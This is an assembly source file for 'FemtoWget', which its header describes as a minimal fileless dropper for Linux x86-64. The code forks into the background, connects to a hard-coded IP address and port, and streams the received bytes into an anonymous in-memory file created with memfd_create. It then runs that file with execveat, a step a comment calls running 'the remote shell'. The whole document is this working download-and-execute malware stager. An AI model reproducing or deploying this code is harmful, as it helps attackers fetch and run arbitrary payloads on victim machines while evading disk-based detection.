;;; 
;;;  *  fwget1. FemtoWget. Minimal dropper in asm (Version 3)
;;;  *  Copyright (c) 2020 pico (@0x00pico at twitter)
;;;  *
;;;  *  This program is free software: you can redistribute it and/or modify
;;;  *  it under the terms of the GNU General Public License as published by
;;;  *  the Free Software Foundation, either version 3 of the License, or
;;;  *  (at your option) any later version.
;;;  *  This program is distributed in the hope that it will be useful,
;;;  *  but WITHOUT ANY WARRANTY; without even the implied warranty of
;;;  *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
;;;  *  GNU General Public License for more details.
;;;  *  You should have received a copy of the GNU General Public License
;;;  *  along with this program.  If not, see <http://www.gnu.org/licenses/>.


section .text
 	global _start

_start:
        ;; if (!fork()) exit
        call _fork
        cmp rax, 0
        jnz end

;;; 	mov r14, rsi		; argv
;;;  	mov r15, rcx		; envp

	;; 	mov rdi, 1
	;;	mov rsi, [rbp + 16] 	; Count the push rbp above
	;;	mov rdx, 7
	;; 	call _write


	;; Variables
	;; [rbp + 0x00] -> buf (unsigned char).. will reuse for /proc string
	;; Create socket
	;; Find contants with: grep -R CONSTANT /usr/include
	;; s = socket (PF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6);
	mov rdi, 2		; PF_INET 2
	mov rsi, 1		; SOCK_STREAM
	mov rdx, 6              ; IPPROTO_TCP
	call _socket
	
	mov r12, rax		; FD should be 4 or 5
	;;  It is unlikely that the socket syscall will fail
	;; 	cmp rax, 0
	;; 	jle error

	;; memfd_create ("a", 1)
	lea rdi, [rel fname]
	;; 	mov rsi, 1
	call _memfd_create
	mov r13, rax		; Save fd in R9

	;; connect (s [rbp+0], addr, 16)
	;; 	 	mov rdi, r8
 	mov edi, r12d		;Saves 1 byte
	;; 	mov rsi, 0x8c0aa8c011110002
	;; 	 	mov rsi, 0x0100007f11110002
	 	lea rsi, [rel addr]
	;; 	mov rdx, 16
	;;	add rdx, 10		; Saves 1 byte :)
	add edx,10
	call _connect
	;;	Just skip error check... if it fails is not gonna work anyway
	;; 	test eax, eax
	;; 	jl error

	lea rsi, [rsp]
l0:				; Read loop
	;; Read data from socket
	;; _read (s = [rbp + 0], [rbp + 0x10], 1024);
	mov rdi, r12
	mov rdx, 1024
	call _read
	cmp rax, 1024
	jl done

	;; Write to stdout
	;; _write (fd, [rbp+0x10], [rbp+0x08])
	mov rdi, r13
	mov rdx, rax
	call _write
	;; 	cmp eax, 1024
	;; 	jl done
	jmp l0
done:
	mov rdi, r12
	call _close
;;;  Run the remote shell
	;; Support functions
	;; 	  snprintf (fname, 1024, "/proc/%d/fd/%d", getpid(), fd)
	;;   execveat (fd, fname + 1, arg, env, 0x1000);

	mov rdi, r13
	lea rsi, [rel fname + 1]
	;; 	xor rdx, rdx
	;; 	xor r10, r10
	lea rdx, [rel par]
	mov r10, rdx
	;; 	lea r10, [rsp + 24]

	mov r8, 0x1000
	call _execat


	;; 	add rsi, 6
	;; Syscalls
_read:
	xor eax,eax
	jmp _do_syscall
	
_write:
	xor eax,eax
	inc eax

	jmp _do_syscall
	
_socket:
	;; mov rax, 41
	xor eax,eax
	add al, 41
	jmp _do_syscall
	
_connect:
	;; 	mov rax, 42
	xor eax,eax
	add al, 42
	jmp _do_syscall
	
_close:
	;; mov rax, 3
	xor eax,eax
	add al, 3
	jmp _do_syscall

;; _unlink:
;;         xor eax, eax
;;         add al, 87
;;         jmp _do_syscall
	
_execat:
	xor eax,eax
	;; 	add al, 59 ; exec
	add ax, 322
	jmp _do_syscall

	
_memfd_create:
	;; mov rax, 3
	xor eax,eax
	add ax, 319
	jmp _do_syscall
	
_fork:
        xor eax,eax
        add al, 57
        jmp _do_syscall

end:	
_exit:
        xor eax,eax
        add al, 60


_do_syscall:
	syscall
	ret
	
;;; 	addr    dq 0x0100007f11110002
	addr    dq 0x0802a8c011110002	
	fname   db "a",0
	nullstr db 0
	div_tbl dw 10000, 1000, 100, 10, 1
	par     dd 0x00000000
filesize equ $ - $$
